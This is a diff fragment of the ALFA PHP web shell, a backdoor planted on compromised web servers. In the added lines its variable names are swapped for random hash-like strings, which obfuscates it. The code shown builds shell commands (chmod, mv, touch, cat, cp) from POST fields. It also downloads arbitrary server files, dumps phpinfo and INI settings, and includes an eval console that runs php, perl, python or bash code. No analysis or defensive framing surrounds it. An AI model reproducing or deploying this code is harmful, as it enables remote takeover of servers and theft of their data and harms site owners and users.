-if(!@chmod($_POST['alfa1'], $perms)){
-if($chdir_fals&&$alfa_canruncmd){
-alfaEx("cd '".addslashes($_POST["c"])."';chmod ".addslashes($_POST['alfa3'])." '".addslashes($alfa1_decoded)."'");
+$xyksvzrf58f57b98cc8cfb81907179e9b4635762 = 0;
+for($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=strlen($_POST['alfa3'])-1;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741>=0;--$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741)
+$xyksvzrf58f57b98cc8cfb81907179e9b4635762 += (int)$_POST['alfa3'][$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]*pow(8, (strlen($_POST['alfa3'])-$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741-1));
+if(!@chmod($_POST['alfa1'], $xyksvzrf58f57b98cc8cfb81907179e9b4635762)){
+if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772&&$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
+alfaEx("cd '".addslashes($_POST["c"])."';chmod ".addslashes($_POST['alfa3'])." '".addslashes($qdtibsqye1811c0c73fb371dc3b92d7bbabfc584)."'");
 echo('Success!');
 }else{
 echo '<font color="#FFFFFF"><b>Can\'t set permissions!</b></font><br><script>document.mf.alfa3.value="";</script>';}
@@ -3126,132 +3199,132 @@ echo '<font color="#FFFFFF"><b>Can\'t set permissions!</b></font><br><script>doc
 }
 clearstatcache();
 AlfaNum(8,9,10,7,6,5,4,2,1);
-if($chdir_fals){
-	$file_perm = $file_info[5];
+if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772){
+	$jldneloy4ac335b84cbc6e1bce3868e38065f567 = $hpqpacum080505fba0c91df9d7cff41d972acaf1[5];
 }else{
-	$file_perm = substr(sprintf('%o', @fileperms($_POST['alfa1'])),-4);
+	$jldneloy4ac335b84cbc6e1bce3868e38065f567 = substr(sprintf('%o', @fileperms($_POST['alfa1'])),-4);
 }
-echo '<script>alfa3_="";</script><form onsubmit="editor(\''.addslashes($_POST['alfa1']).'\',\''.$_POST['alfa2'].'\',this.chmod.value,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\');return false;"><input type="text" name="chmod" value="'.$file_perm.'"><input type=submit value=" "></form>';
+echo '<script>alfa3_="";</script><form onsubmit="editor(\''.addslashes($_POST['alfa1']).'\',\''.$_POST['alfa2'].'\',this.chmod.value,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$yvdtggga39bb421562d6f6128a957f3d162538d2.'\');return false;"><input type="text" name="chmod" value="'.$jldneloy4ac335b84cbc6e1bce3868e38065f567.'"><input type=submit value=" "></form>';
 break;
 case 'hexdump':
 @chdir($_POST['c']);
-$c = __read_file($_POST['alfa1']);
-$n = 0;
-$h = array('00000000<br>','','');
-$len = strlen($c);
-for ($i=0; $i<$len; ++$i) {
-$h[1] .= sprintf('%02X',ord($c[$i])).' ';
-switch ( ord($c[$i]) ) {
-case 0: $h[2] .= ' '; break;
-case 9: $h[2] .= ' '; break;
-case 10: $h[2] .= ' '; break;
-case 13: $h[2] .= ' '; break;
-default: $h[2] .= $c[$i]; break;
+$yyphbkaj4a8a08f09d37b73795649038408b5f33 = __read_file($_POST['alfa1']);
+$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1 = 0;
+$cvnwfemf2510c39011c5be704182423e3a695e91 = array('00000000<br>','','');
+$qfmncdsof5a8e923f8cd24b56b3bab32358cc58a = strlen($yyphbkaj4a8a08f09d37b73795649038408b5f33);
+for ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=0; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741<$qfmncdsof5a8e923f8cd24b56b3bab32358cc58a; ++$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741) {
+$cvnwfemf2510c39011c5be704182423e3a695e91[1] .= sprintf('%02X',ord($yyphbkaj4a8a08f09d37b73795649038408b5f33[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741])).' ';
+switch ( ord($yyphbkaj4a8a08f09d37b73795649038408b5f33[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]) ) {
+case 0: $cvnwfemf2510c39011c5be704182423e3a695e91[2] .= ' '; break;
+case 9: $cvnwfemf2510c39011c5be704182423e3a695e91[2] .= ' '; break;
+case 10: $cvnwfemf2510c39011c5be704182423e3a695e91[2] .= ' '; break;
+case 13: $cvnwfemf2510c39011c5be704182423e3a695e91[2] .= ' '; break;
+default: $cvnwfemf2510c39011c5be704182423e3a695e91[2] .= $yyphbkaj4a8a08f09d37b73795649038408b5f33[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]; break;
 }
-$n++;
-if ($n == 32) {
-$n = 0;
-if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
-$h[1] .= '<br>';
-$h[2] .= "\n";
+$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1++;
+if ($qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1 == 32) {
+$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1 = 0;
+if ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741+1 < $qfmncdsof5a8e923f8cd24b56b3bab32358cc58a) {$cvnwfemf2510c39011c5be704182423e3a695e91[0] .= sprintf('%08X',$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741+1).'<br>';}
+$cvnwfemf2510c39011c5be704182423e3a695e91[1] .= '<br>';
+$cvnwfemf2510c39011c5be704182423e3a695e91[2] .= "\n";
 }
 }
-echo '<div class="editor-view"><div class="view-content"><table cellspacing=1 cellpadding=5 bgcolor=black><tr><td bgcolor=gray><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#282828><pre>'.$h[1].'</pre></td><td bgcolor=#333333><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table></div></div>';
+echo '<div class="editor-view"><div class="view-content"><table cellspacing=1 cellpadding=5 bgcolor=black><tr><td bgcolor=gray><span style="font-weight: normal;"><pre>'.$cvnwfemf2510c39011c5be704182423e3a695e91[0].'</pre></span></td><td bgcolor=#282828><pre>'.$cvnwfemf2510c39011c5be704182423e3a695e91[1].'</pre></td><td bgcolor=#333333><pre>'.htmlspecialchars($cvnwfemf2510c39011c5be704182423e3a695e91[2]).'</pre></td></tr></table></div></div>';
 break;
 case 'rename':
 @chdir($_POST['c']);
-$alfa1_escape = addslashes($_POST["alfa1"]);
-$alfa3_escape = addslashes($_POST["alfa3"]);
+$ykfrrysfb3101d8ff211f7523e7c281757437a55 = addslashes($_POST["alfa1"]);
+$nsaqznrb95afd2e2e53938fe3786049402e4e518 = addslashes($_POST["alfa3"]);
 if(!empty($_POST['alfa3'])){
-$cmd_rename = false;
-if($chdir_fals&&$alfa_canruncmd){
+$cttyjrbbaca66cb949843e056d7268641b9b74cc = false;
+if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772&&$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
 if(_alfa_is_writable($_POST['alfa1'])){
-$alfa1_escape = addslashes($alfa1_decoded);
-alfaEx("cd '".addslashes($_POST['c'])."';mv '".$alfa1_escape."' '".addslashes($_POST['alfa3'])."'");
+$ykfrrysfb3101d8ff211f7523e7c281757437a55 = addslashes($qdtibsqye1811c0c73fb371dc3b92d7bbabfc584);
+alfaEx("cd '".addslashes($_POST['c'])."';mv '".$ykfrrysfb3101d8ff211f7523e7c281757437a55."' '".addslashes($_POST['alfa3'])."'");
 }else{
-$cmd_rename = true;
+$cttyjrbbaca66cb949843e056d7268641b9b74cc = true;
 }
 }else{
-$alfa1_escape = addslashes($_POST["alfa1"]);
+$ykfrrysfb3101d8ff211f7523e7c281757437a55 = addslashes($_POST["alfa1"]);
 }
-if(!@rename($_POST['alfa1'], $_POST['alfa3'])&&$cmd_rename){
-echo 'Can\'t rename!<br>';}else{echo('Renamed!<script>try{$("'.$_POST['alfa4'].'").innerHTML = "<div class=\'editor-icon\'>"+loadType(\''.$alfa3_escape.'\',\''.$ftype.'\',\''.$_POST['alfa4'].'\')+"</div><div class=\'editor-file-name\'>'.$alfa3_escape.'</div>";editor_files["'.$_POST['alfa4'].'"].file = "'.$alfa3_escape.'";updateFileEditor("'.$alfa1_escape.'", "'.$alfa3_escape.'");'.($ftype == "dir"?"updateDirsEditor('".$_POST['alfa4']."','".$alfa1_escape."');":"").'}catch(e){console.log(e)}</script>');$alfa1_escape = $alfa3_escape;}
+if(!@rename($_POST['alfa1'], $_POST['alfa3'])&&$cttyjrbbaca66cb949843e056d7268641b9b74cc){
+echo 'Can\'t rename!<br>';}else{echo('Renamed!<script>try{$("'.$_POST['alfa4'].'").innerHTML = "<div class=\'editor-icon\'>"+loadType(\''.$nsaqznrb95afd2e2e53938fe3786049402e4e518.'\',\''.$yvdtggga39bb421562d6f6128a957f3d162538d2.'\',\''.$_POST['alfa4'].'\')+"</div><div class=\'editor-file-name\'>'.$nsaqznrb95afd2e2e53938fe3786049402e4e518.'</div>";editor_files["'.$_POST['alfa4'].'"].file = "'.$nsaqznrb95afd2e2e53938fe3786049402e4e518.'";updateFileEditor("'.$ykfrrysfb3101d8ff211f7523e7c281757437a55.'", "'.$nsaqznrb95afd2e2e53938fe3786049402e4e518.'");'.($yvdtggga39bb421562d6f6128a957f3d162538d2 == "dir"?"updateDirsEditor('".$_POST['alfa4']."','".$ykfrrysfb3101d8ff211f7523e7c281757437a55."');":"").'}catch(e){console.log(e)}</script>');$ykfrrysfb3101d8ff211f7523e7c281757437a55 = $nsaqznrb95afd2e2e53938fe3786049402e4e518;}
 }
-echo '<form onsubmit="editor(\''.$alfa1_escape.'\',\''.$_POST['alfa2'].'\',this.name.value,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\');return false;"><input type="text" name="name" value="'.addslashes(htmlspecialchars(isset($_POST['alfa3'])&&$_POST['alfa3']!=''?$_POST['alfa3']:$alfa1_decoded)).'"><input type=submit value=" "></form>';
+echo '<form onsubmit="editor(\''.$ykfrrysfb3101d8ff211f7523e7c281757437a55.'\',\''.$_POST['alfa2'].'\',this.name.value,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$yvdtggga39bb421562d6f6128a957f3d162538d2.'\');return false;"><input type="text" name="name" value="'.addslashes(htmlspecialchars(isset($_POST['alfa3'])&&$_POST['alfa3']!=''?$_POST['alfa3']:$qdtibsqye1811c0c73fb371dc3b92d7bbabfc584)).'"><input type=submit value=" "></form>';
 break;
 case 'touch':
 @chdir($_POST['c']);
 if( !empty($_POST['alfa3']) ) {
-$time = strtotime($_POST['alfa3']);
-if($time){
-$touched = false;
-if($chdir_fals&&$alfa_canruncmd){
-	alfaEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['alfa3']))."' '".addslashes($alfa1_decoded)."'");
-	$touched = true;
+$ouidxbfr07cc694b9b3fc636710fa08b6922c42b = strtotime($_POST['alfa3']);
+if($ouidxbfr07cc694b9b3fc636710fa08b6922c42b){
+$xehyltdw62698b8ff9e416d9a7ac0fb3bd548b96 = false;
+if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772&&$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
+	alfaEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['alfa3']))."' '".addslashes($qdtibsqye1811c0c73fb371dc3b92d7bbabfc584)."'");
+	$xehyltdw62698b8ff9e416d9a7ac0fb3bd548b96 = true;
 }
-if(!@touch($_POST['alfa1'],$time,$time)&&!$touched)
+if(!@touch($_POST['alfa1'],$ouidxbfr07cc694b9b3fc636710fa08b6922c42b,$ouidxbfr07cc694b9b3fc636710fa08b6922c42b)&&!$xehyltdw62698b8ff9e416d9a7ac0fb3bd548b96)
 echo 'Fail!';
 else
 echo 'Touched!';
 } else echo 'Bad time format!';
 }
 clearstatcache();
-echo '<script>alfa3_="";</script><form onsubmit="editor(\''.addslashes($_POST['alfa1']).'\',\''.$_POST['alfa2'].'\',this.touch.value,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\');return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", ($chdir_fals?$file_info[4]:@filemtime($_POST['alfa1']))).'"><input type=submit value=" "></form>';
+echo '<script>alfa3_="";</script><form onsubmit="editor(\''.addslashes($_POST['alfa1']).'\',\''.$_POST['alfa2'].'\',this.touch.value,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$yvdtggga39bb421562d6f6128a957f3d162538d2.'\');return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", ($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772?$hpqpacum080505fba0c91df9d7cff41d972acaf1[4]:@filemtime($_POST['alfa1']))).'"><input type=submit value=" "></form>';
 break;
 case 'image':
 @chdir($_POST['c']);
 echo('<hr>');
-$file = $_POST['alfa1'];
-$image_info = @getimagesize($file);
-if(is_array($image_info)||$chdir_fals){
-$width = (int)$image_info[0];
-$height = (int)$image_info[1];
-if($chdir_fals&&$alfa_canruncmd){
-	$source = alfaEx("cat '".addslashes($file)."' | base64");
-	list($width, $height) = explode(":", alfaEx("identify -format '%w:%h' '".addslashes($file)."'"));
-	$mime = explode(":", alfaEx("file --mime-type '".addslashes($file)."'"));
-	$image_info['mime'] = $mime[1];
+$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = $_POST['alfa1'];
+$mdytkcgm4e84c247e9be8c08d521b216b1161ac9 = @getimagesize($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
+if(is_array($mdytkcgm4e84c247e9be8c08d521b216b1161ac9)||$qfbxlugo26d40443ff695aa5ca38b91e8a4b7772){
+$krjliyrveaae26a6fb20ed3ef54fb23bfa0b1fcc = (int)$mdytkcgm4e84c247e9be8c08d521b216b1161ac9[0];
+$txtdplwpb435e227d5dd201e1768b2bcb2e0aa81 = (int)$mdytkcgm4e84c247e9be8c08d521b216b1161ac9[1];
+if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772&&$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
+	$kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb = alfaEx("cat '".addslashes($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)."' | base64");
+	list($krjliyrveaae26a6fb20ed3ef54fb23bfa0b1fcc, $txtdplwpb435e227d5dd201e1768b2bcb2e0aa81) = explode(":", alfaEx("identify -format '%w:%h' '".addslashes($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)."'"));
+	$allbrbted02a169f33469c888396a24dd9d9f1c6 = explode(":", alfaEx("file --mime-type '".addslashes($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)."'"));
+	$mdytkcgm4e84c247e9be8c08d521b216b1161ac9['mime'] = $allbrbted02a169f33469c888396a24dd9d9f1c6[1];
 }else{
-	$source = __ZW5jb2Rlcg(__read_file($file, false));
+	$kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb = __ZW5jb2Rlcg(__read_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, false));
 }
-$image_info_h = "Image type = <span>[</span> ".$image_info['mime']." <span>]</span><br>Image Size = <span>[ </span>".$width." x ".$height."<span> ]</span><br>";
-if($width > 800){$width = 800;}
-echo $content = "<div class='editor-view'><div class='view-content'><center>".$image_info_h."<br><img id='viewImage' style='max-width:100%;border:1px solid green;' src='data:".$image_info['mime'].";base64,".$source."' alt='".$file."'></center></div></div><br>";
+$gbacnlfd9c91d71dd82f2db73fd3d48ad70689f4 = "Image type = <span>[</span> ".$mdytkcgm4e84c247e9be8c08d521b216b1161ac9['mime']." <span>]</span><br>Image Size = <span>[ </span>".$krjliyrveaae26a6fb20ed3ef54fb23bfa0b1fcc." x ".$txtdplwpb435e227d5dd201e1768b2bcb2e0aa81."<span> ]</span><br>";
+if($krjliyrveaae26a6fb20ed3ef54fb23bfa0b1fcc > 800){$krjliyrveaae26a6fb20ed3ef54fb23bfa0b1fcc = 800;}
+echo $mveevork9a0364b9e99bb480dd25e1f0284c8555 = "<div class='editor-view'><div class='view-content'><center>".$gbacnlfd9c91d71dd82f2db73fd3d48ad70689f4."<br><img id='viewImage' style='max-width:100%;border:1px solid green;' src='data:".$mdytkcgm4e84c247e9be8c08d521b216b1161ac9['mime'].";base64,".$kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb."' alt='".$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac."'></center></div></div><br>";
 }
 break;
 }
 echo '</div>';
 alfaFooter();
 }
-function findicon($file,$type){
-$s = 'http://solevisible.com/icons/';
-$types = array('json','ppt','pptx','xls','xlsx','msi','config','cgi','pm','c','cpp','cs','java','aspx','asp','db','ttf','eot','woff','woff2','woff','conf','log','apk','cab','bz2','tgz','dmg','izo','jar','7z','iso','rar','bat','sh','alfa','gz','tar','php','php4','php5','phtml','html','xhtml','shtml','htm','zip','png','jpg','jpeg','gif','bmp','ico','txt','js','rb','py','xml','css','sql','htaccess','pl','ini','dll','exe','mp3','mp4','m4a','mov','flv','swf','mkv','avi','wmv','mpg','mpeg','dat','pdf','3gp','doc','docx','docm');
-if($type!='file'){
-return ($file=='..'?$s.'back.png':$s.'folder.png');
+function findicon($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,$hcgexxko599dcce2998a6b40b1e38e8c6006cb0a){
+$fwekvgvg03c7c0ace395d80182db07ae2c30f034 = 'http://solevisible.com/icons/';
+$cucabfuhd14a8022b085f9ef19d479cbdd581127 = array('json','ppt','pptx','xls','xlsx','msi','config','cgi','pm','c','cpp','cs','java','aspx','asp','db','ttf','eot','woff','woff2','woff','conf','log','apk','cab','bz2','tgz','dmg','izo','jar','7z','iso','rar','bat','sh','alfa','gz','tar','php','php4','php5','phtml','html','xhtml','shtml','htm','zip','png','jpg','jpeg','gif','bmp','ico','txt','js','rb','py','xml','css','sql','htaccess','pl','ini','dll','exe','mp3','mp4','m4a','mov','flv','swf','mkv','avi','wmv','mpg','mpeg','dat','pdf','3gp','doc','docx','docm');
+if($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a!='file'){
+return ($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac=='..'?$fwekvgvg03c7c0ace395d80182db07ae2c30f034.'back.png':$fwekvgvg03c7c0ace395d80182db07ae2c30f034.'folder.png');
 }else{
-$ext = explode('.',$file);
-$ext = end($ext);
-$ext = strtolower($ext);
-return (in_array($ext,$types)?$s.$ext.'.png':$s.'notfound.png');
+$uzehrcsaabf77184f55403d75b9d51d79162a7ca = explode('.',$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
+$uzehrcsaabf77184f55403d75b9d51d79162a7ca = end($uzehrcsaabf77184f55403d75b9d51d79162a7ca);
+$uzehrcsaabf77184f55403d75b9d51d79162a7ca = strtolower($uzehrcsaabf77184f55403d75b9d51d79162a7ca);
+return (in_array($uzehrcsaabf77184f55403d75b9d51d79162a7ca,$cucabfuhd14a8022b085f9ef19d479cbdd581127)?$fwekvgvg03c7c0ace395d80182db07ae2c30f034.$uzehrcsaabf77184f55403d75b9d51d79162a7ca.'.png':$fwekvgvg03c7c0ace395d80182db07ae2c30f034.'notfound.png');
 }
 }
 function alfadlfile(){
 if(isset($_POST['c'],$_POST['file'])){
-$basename = rawurldecode(basename($_POST['file']));
-$_POST['file'] = str_replace("//", "/", $_POST['c'].'/'.$basename);
-$alfa_canruncmd = _alfa_can_runCommand(true,true);
-if(@is_file($_POST['file']) && @is_readable($_POST['file']) || $alfa_canruncmd){
+$reppeyoy954eb83bca864c64ee1e669dfab01c95 = rawurldecode(basename($_POST['file']));
+$_POST['file'] = str_replace("//", "/", $_POST['c'].'/'.$reppeyoy954eb83bca864c64ee1e669dfab01c95);
+$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7 = _alfa_can_runCommand(true,true);
+if(@is_file($_POST['file']) && @is_readable($_POST['file']) || $mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
 ob_start("ob_gzhandler", 4096);
-header("Content-Disposition: attachment; filename=\"".addslashes($basename)."\"");
+header("Content-Disposition: attachment; filename=\"".addslashes($reppeyoy954eb83bca864c64ee1e669dfab01c95)."\"");
 header("Content-Type: application/octet-stream");
 if($GLOBALS["glob_chdir_false"]){
-	$randname = $basename.rand(111,9999);
-	$scriptpath = dirname($_SERVER["SCRIPT_FILENAME"]);
-	$filepath = $scriptpath."/".$randname;
-	if(_alfa_is_writable($scriptpath)){
-		alfaEx("cp '".addslashes($_POST["file"])."' '".addslashes($filepath)."'");
-		readfile($filepath);
-		@unlink($filepath);
+	$nljvfvfm1169f7b37065619357fee6e3b71c8376 = $reppeyoy954eb83bca864c64ee1e669dfab01c95.rand(111,9999);
+	$ajwomwbr060f3f7c2a71bb4afa792e03af1ab106 = dirname($_SERVER["SCRIPT_FILENAME"]);
+	$rabzzsbu6a2a431fe8b621037ea949531c28551d = $ajwomwbr060f3f7c2a71bb4afa792e03af1ab106."/".$nljvfvfm1169f7b37065619357fee6e3b71c8376;
+	if(_alfa_is_writable($ajwomwbr060f3f7c2a71bb4afa792e03af1ab106)){
+		alfaEx("cp '".addslashes($_POST["file"])."' '".addslashes($rabzzsbu6a2a431fe8b621037ea949531c28551d)."'");
+		readfile($rabzzsbu6a2a431fe8b621037ea949531c28551d);
+		@unlink($rabzzsbu6a2a431fe8b621037ea949531c28551d);
 	}else{
 		alfaEx("cat '".addslashes($_POST["file"])."'");
 	}
@@ -3259,81 +3332,81 @@ if($GLOBALS["glob_chdir_false"]){
 	readfile($_POST['file']);
 }
 }else echo('Error...!');}}
-function __alfa_set_cookie($key, $value){
-	$_COOKIE[$key] = $value;
-	@setcookie($key, $value, time()+(86400 * 7), '/');
+function __alfa_set_cookie($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d, $rkptsoeg2063c1608d6e0baf80249c42e2be5804){
+	$_COOKIE[$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d] = $rkptsoeg2063c1608d6e0baf80249c42e2be5804;
+	@setcookie($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d, $rkptsoeg2063c1608d6e0baf80249c42e2be5804, time()+(86400 * 7), '/');
 }
 function alfaphpeval(){
 if(isset($_COOKIE["eval_tmpdir"])&&@is_dir($_COOKIE["eval_tmpdir"])){
-	$tempdir = __ZGVjb2Rlcg($_COOKIE["eval_tmpdir"]);
+	$htevsqbb739d36023175752110e878e3b5872b5e = __ZGVjb2Rlcg($_COOKIE["eval_tmpdir"]);
 }else{
-	$tempdir = dirname(alfaEx("mktemp"));
-	__alfa_set_cookie("eval_tmpdir", __ZW5jb2Rlcg($tempdir));
+	$htevsqbb739d36023175752110e878e3b5872b5e = dirname(alfaEx("mktemp"));
+	__alfa_set_cookie("eval_tmpdir", __ZW5jb2Rlcg($htevsqbb739d36023175752110e878e3b5872b5e));
 }
 alfahead();
 if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'ini')){
 echo '<div class=header>';
 ob_start();
-$INI=ini_get_all();
+$mvghszwj19cf3bd8d7d38ff28b25e78c190c6262=ini_get_all();
 print '<table border=0><tr>'
 .'<td class="listing"><font class="highlight_txt">Param</td>'
 .'<td class="listing"><font class="highlight_txt">Global value</td>'
 .'<td class="listing"><font class="highlight_txt">Local Value</td>'
 .'<td class="listing"><font class="highlight_txt">Access</td></tr>';
-foreach ($INI as $param => $values)
+foreach ($mvghszwj19cf3bd8d7d38ff28b25e78c190c6262 as $noknfouyeca07335a33c5aeb5e1bc7c98b4b9d80 => $pthtpqlmf09cc7ee3a9a93273f4b80601cafb00c)
 print "\n".'<tr>'
-.'<td class="listing"><b>'.$param.'</td>'
-.'<td class="listing">'.$values['global_value'].' </td>'
-.'<td class="listing">'.$values['local_value'].' </td>'
-.'<td class="listing">'.$values['access'].' </td></tr>';
-$tmp = ob_get_clean();
-$tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$tmp);
-$tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
-echo str_replace('<h1','<h2', $tmp) .'</div><br>';
+.'<td class="listing"><b>'.$noknfouyeca07335a33c5aeb5e1bc7c98b4b9d80.'</td>'
+.'<td class="listing">'.$pthtpqlmf09cc7ee3a9a93273f4b80601cafb00c['global_value'].' </td>'
+.'<td class="listing">'.$pthtpqlmf09cc7ee3a9a93273f4b80601cafb00c['local_value'].' </td>'
+.'<td class="listing">'.$pthtpqlmf09cc7ee3a9a93273f4b80601cafb00c['access'].' </td></tr>';
+$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef = ob_get_clean();
+$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef);
+$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef);
+echo str_replace('<h1','<h2', $wgjruzxgfa816edb83e95bf0c8da580bdfd491ef) .'</div><br>';
 }
 if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'info')) {
 echo '<div class=header><style>.p {color:#000;}</style>';
 ob_start();
 phpinfo();
-$tmp = ob_get_clean();
-$tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$tmp);
-$tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
-echo str_replace('<h1','<h2', $tmp) .'</div><br>';
+$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef = ob_get_clean();
+$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef);
+$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef);
+echo str_replace('<h1','<h2', $wgjruzxgfa816edb83e95bf0c8da580bdfd491ef) .'</div><br>';
 }
 if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'exten')) {
 echo '<div class=header>';
 ob_start();
-$EXT=get_loaded_extensions();
-echo '<table border=0><tr><td class="listing">'.implode('</td></tr>'."\n".'<tr><td class="listing">', $EXT).'</td></tr></table>'.count($EXT).' extensions loaded';
+$gtxoqfnhefd472d9664cd3e8c9e924f35e3f6c88=get_loaded_extensions();
+echo '<table border=0><tr><td class="listing">'.implode('</td></tr>'."\n".'<tr><td class="listing">', $gtxoqfnhefd472d9664cd3e8c9e924f35e3f6c88).'</td></tr></table>'.count($gtxoqfnhefd472d9664cd3e8c9e924f35e3f6c88).' extensions loaded';
 echo '</div><br>';
 }
-$lang_html = "";
-foreach(array("php"=>"php ~> [ Windows / Linux ]","perl"=>"perl ~> [ Linux ]","python"=>"python ~> [ Linux ]","bash"=>"bash ~> [ Linux ]") as $key=>$val){$lang_html .= '<option value="'.$key.'" '.($_POST["alfa3"]==$key?"selected":"").'>'.$val.'</option>';}
-echo '<div class=header><Center><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'ini\')">| INI_INFO | </a><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'info\')"> | phpinfo |</a><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'exten\')"> | extensions |</a></center><br><form class="php-evals" name="pf" method="post" onsubmit="var ace_value=geEvalAceValue(this);g(\'phpeval\',null,ace_value,null,this.language.value); return false;"><div class="txtfont">Select Language: </div> <select name="language" style="width:300px;">'.$lang_html.'</select>'._alfa_load_ace_options("eval").'<br><br><div class="bigarea" style="position:relative;"><div class="php-evals-ace">'.(!empty($_POST['alfa1'])?htmlspecialchars($_POST['alfa1']):"&lt;?php\n\n\techo('hello alfa !');\n\n?>").'</div></div><center><input type="submit" value="" style="margin-top:5px"></center>';
+$cuxzaetv30eb9e5bb6316207d37cf1de8f3353a6 = "";
+foreach(array("php"=>"php ~> [ Windows / Linux ]","perl"=>"perl ~> [ Linux ]","python"=>"python ~> [ Linux ]","bash"=>"bash ~> [ Linux ]") as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf){$cuxzaetv30eb9e5bb6316207d37cf1de8f3353a6 .= '<option value="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'" '.($_POST["alfa3"]==$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d?"selected":"").'>'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'</option>';}
+echo '<div class=header><Center><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'ini\')">| INI_INFO | </a><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'info\')"> | phpinfo |</a><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'exten\')"> | extensions |</a></center><br><form class="php-evals" name="pf" method="post" onsubmit="var ace_value=geEvalAceValue(this);g(\'phpeval\',null,ace_value,null,this.language.value); return false;"><div class="txtfont">Select Language: </div> <select name="language" style="width:300px;">'.$cuxzaetv30eb9e5bb6316207d37cf1de8f3353a6.'</select>'._alfa_load_ace_options("eval").'<br><br><div class="bigarea" style="position:relative;"><div class="php-evals-ace">'.(!empty($_POST['alfa1'])?htmlspecialchars($_POST['alfa1']):"&lt;?php\n\n\techo('hello alfa !');\n\n?>").'</div></div><center><input type="submit" value="" style="margin-top:5px"></center>';
